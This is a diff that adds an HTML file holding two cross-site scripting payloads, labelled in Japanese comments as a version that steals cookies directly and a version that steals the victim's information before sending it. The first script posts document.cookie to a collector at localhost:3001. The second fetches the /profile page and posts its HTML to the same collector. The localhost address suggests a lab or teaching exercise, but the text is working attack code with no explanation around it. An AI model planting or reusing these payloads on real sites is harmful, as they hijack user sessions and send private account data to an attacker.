@@ -1,0 +1,30 @@
+<!-- cookieを直接盗むバージョン -->
+<script>
+  async function request() {
+    const res = await fetch('http://localhost:3001', {
+      method: 'post',
+      mode: 'no-cors',
+      body: JSON.stringify({cookie: document.cookie})
+    })
+    console.log(res)
+  }
+
+  request()
+</script>
+
+<!-- 相手の情報を盗んでから送るバージョン -->
+<script>
+  async function request() {
+    const pres = await fetch('/profile')
+    const profileHtml = await pres.text()
+
+    const res = await fetch('http://localhost:3001', {
+      method: 'post',
+      mode: 'no-cors',
+      body: JSON.stringify({html: profileHtml})
+    })
+    console.log(res)
+  }
+
+  request()
+</script>
